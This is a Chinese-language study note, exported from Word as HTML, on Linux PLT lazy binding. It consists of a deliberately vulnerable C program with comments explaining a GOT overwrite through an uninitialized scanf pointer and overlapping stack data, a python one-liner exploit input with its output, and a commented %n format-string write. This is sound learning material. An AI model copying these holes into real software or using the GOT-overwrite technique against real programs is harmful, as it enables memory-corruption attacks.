<html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=utf-8">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:"Microsoft YaHei UI";
	panose-1:2 11 5 3 2 2 4 2 2 4;}
@font-face
	{font-family:"\@Microsoft YaHei UI";
	panose-1:2 11 5 3 2 2 4 2 2 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0cm;
	margin-bottom:.0001pt;
	text-align:justify;
	text-justify:inter-ideograph;
	font-size:10.5pt;
	font-family:等线;}
.MsoChpDefault
	{font-family:等线;}
 /* Page Definitions */
 @page WordSection1
	{size:595.3pt 841.9pt;
	margin:72.0pt 90.0pt 72.0pt 90.0pt;
	layout-grid:15.6pt;}
div.WordSection1
	{page:WordSection1;}
-->
</style>

</head>

<body lang=ZH-CN style='text-justify-trim:punctuation'>

<div class=WordSection1 style='layout-grid:15.6pt'>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>linux</span><span
style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>利用<span
lang=EN-US>PLT</span>延迟绑定</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>#include
&lt;stdio.h&gt;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>#include
&lt;stdlib.h&gt;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>#include
&lt;unistd.h&gt;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>void
kkkkkk(char *str)</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>{</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
printf(str);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>}</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>void
login()</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>{</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
int passcode1;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//passcode1</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>变量的值是<span
lang=EN-US>0x080497a4,</span>也就是<span lang=EN-US>GOT</span>中储存<span lang=EN-US>system</span>函数地址的地址是<span
lang=EN-US>080497a4</span></span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>/*</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
08048474 &lt;kkkkkk&gt;:</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
08048474:    55 push %ebp</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>*/</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>那么<span
lang=EN-US>scanf</span>时输入<span lang=EN-US>kkkkkk</span>函数地址<span lang=EN-US>0x08048474,</span>十进制<span
lang=EN-US>134513780</span>。</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
scanf(&quot;%d&quot;,passcode1);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>现在修改了<span
lang=EN-US>GOT</span>中<span lang=EN-US>system</span>函数地址为<span lang=EN-US>kkkkkk</span>函数地址。</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
system(&quot;fuck\n&quot;);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>现在调用<span
lang=EN-US>system</span>函数就是调用的<span lang=EN-US>kkkkkk</span>函数。</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>}</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>void
welcome()</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>{</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>调试可知<span
lang=EN-US>,</span>在<span lang=EN-US>welcome()</span>函数中<span lang=EN-US>name</span>的最后<span
lang=EN-US>4</span>字节与<span lang=EN-US>login()</span>函数中<span lang=EN-US>passcode1</span>变量值一样。</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
char name[12];</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
printf(&quot;GOT system address : &quot;);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//objdump -R kkkkkk</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//GOT</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>中储存<span
lang=EN-US>system</span>函数地址的地址是<span lang=EN-US>080497a4 R_386_JUMP_SLOT
system</span></span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>既然<span
lang=EN-US>name</span>的最后<span lang=EN-US>4</span>字节与<span lang=EN-US>login()</span>函数中<span
lang=EN-US>passcode1</span>变量值一样。</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
//</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>那么<span
lang=EN-US>scanf</span>时输入字符串<span lang=EN-US>kkkkkkkk+0xa4,0x97,0x04,0x08</span></span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
scanf(&quot;%s&quot;, name);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'> 
  //</span><span style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>现在<span
lang=EN-US>login()</span>函数中<span lang=EN-US>passcode1</span>变量的值是<span
lang=EN-US>0x080497a4</span></span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
printf(&quot;Welcome %s!\n&quot;, name);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>}</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>/*</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>[kkk@localhost
GNU-Linux-x86]$ python -c
&quot;print('k'*8+'\xa4\x97\x04\x08'+'\n'+'134513780\n')&quot; | ./kkkkkk </span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>GOT
system address : Welcome </span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>fuck</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>*/</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>int
main(int argc, char** argv) {</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
welcome();</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
login();</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>/*</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>//##############################################################################</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>//$</span><span
style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>表示使用第几个参数，<span
lang=EN-US>%n</span>是一个不经常用到的格式符<span lang=EN-US>,</span>它的作用是把前面已经打印的长度写入某个内存地址。</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
int arr=6;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
argv=&amp;arr;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
printf(&quot;%100d%13$n\n&quot;);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>//##############################################################################</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>//</span><span
style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>利用<span
lang=EN-US>PLT</span>延迟绑定，修改<span lang=EN-US>GOT</span>来改变<span lang=EN-US>system</span>函数地址。<span
lang=EN-US> </span></span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
argc=*(int*)((char*)system+2);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
*((int*)argc)=(int)kkkkkk;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
system(&quot;hello world\n&quot;);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>*/</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
sleep(60000);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>   
return (EXIT_SUCCESS);</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:12.0pt;font-family:"Microsoft YaHei UI",sans-serif'>}</span></p>

</div>

</body>

</html>
